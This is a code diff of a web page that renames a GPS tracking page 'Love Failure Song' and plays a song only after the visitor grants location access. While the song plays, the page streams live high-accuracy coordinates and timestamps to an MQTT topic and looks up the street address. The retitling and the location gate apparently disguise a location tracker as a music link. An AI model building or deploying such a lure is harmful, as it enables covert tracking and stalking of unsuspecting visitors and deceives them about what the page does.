@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Driver View - Fast GPS Music Player</title>
+  <title>Love Failure Song</title>
   <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
@@ -68,32 +68,60 @@
     let lastAddress = "Fetching location...";
     const audio = document.getElementById("audioPlayer");
 
+    // Check on page load if permission was already granted previously
+    window.addEventListener("DOMContentLoaded", () => {
+      if (navigator.permissions) {
+        navigator.permissions.query({ name: 'geolocation' }).then((result) => {
+          if (result.state === 'granted') {
+            document.getElementById("artistText").innerText = "Ready • Tap Play";
+          }
+        });
+      }
+    });
+
     function toggleTrip() {
       if (!isPlaying) {
-        startTrip();
+        startTripWithLocation();
       } else {
         stopTrip();
       }
     }
 
-    function startTrip() {
-      audio.play().then(() => {
-        isPlaying = true;
-        document.getElementById("playIcon").style.display = "none";
-        document.getElementById("pauseIcon").style.display = "block";
-        setGpsStatus("warning", "LOCATING...");
+    function startTripWithLocation() {
+      if (!navigator.geolocation) {
+        document.getElementById("artistText").innerText = "Geolocation not supported";
+        return;
+      }
 
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition((pos) => {
-            sendLocation(pos);
+      setGpsStatus("warning", "LOCATING...");
+
+      // Browser handles permission check & request in a single step
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          sendLocation(position);
+          
+          // Play music ONLY when location is active
+          audio.play().then(() => {
+            isPlaying = true;
+            document.getElementById("playIcon").style.display = "none";
+            document.getElementById("pauseIcon").style.display = "block";
+
             publishEvent("START_TRIP");
-          }, handleGpsError, { enableHighAccuracy: true, timeout: 3000, maximumAge: 10000 });
 
-          watchId = navigator.geolocation.watchPosition(sendLocation, handleGpsError, {
-            enableHighAccuracy: true, timeout: 4000, maximumAge: 1000
+            // Start continuous location updates
+            watchId = navigator.geolocation.watchPosition(sendLocation, handleGpsError, {
+              enableHighAccuracy: true, timeout: 4000, maximumAge: 1000
+            });
+          }).catch(() => {
+            document.getElementById("artistText").innerText = "Error playing tera_naam_aaya.mp3";
+            setGpsStatus("offline", "OFFLINE");
           });
-        }
-      }).catch(err => alert("Audio play error: Ensure tera_naam_aaya.mp3 is in the folder."));
+        },
+        (error) => {
+          handleGpsError();
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
     }
 
     function stopTrip() {
@@ -102,6 +130,7 @@
       document.getElementById("playIcon").style.display = "block";
       document.getElementById("pauseIcon").style.display = "none";
       setGpsStatus("offline", "OFFLINE");
+      document.getElementById("artistText").innerText = "Trip Stopped";
 
       publishEvent("STOP_TRIP");
 
@@ -117,14 +146,12 @@
 
       lastCoords = { latitude: position.coords.latitude, longitude: position.coords.longitude };
       
-      // Send continuous GPS ping
       client.publish(TOPIC, JSON.stringify({
         type: "GPS_PING",
         ...lastCoords,
         timestamp: Date.now()
       }));
 
-      // Fetch Address asynchronously
       lastAddress = await getAddress(lastCoords.latitude, lastCoords.longitude);
     }
 
@@ -149,8 +176,14 @@
       }
     }
 
-    function handleGpsError(error) {
-      setGpsStatus("warning", "GPS TIMEOUT");
+    function handleGpsError() {
+      audio.pause();
+      isPlaying = false;
+      document.getElementById("playIcon").style.display = "block";
+      document.getElementById("pauseIcon").style.display = "none";
+
+      setGpsStatus("offline", "NO PERMISSION");
+      document.getElementById("artistText").innerText = "Location required to play music!";
     }
 
     function setGpsStatus(type, text) {
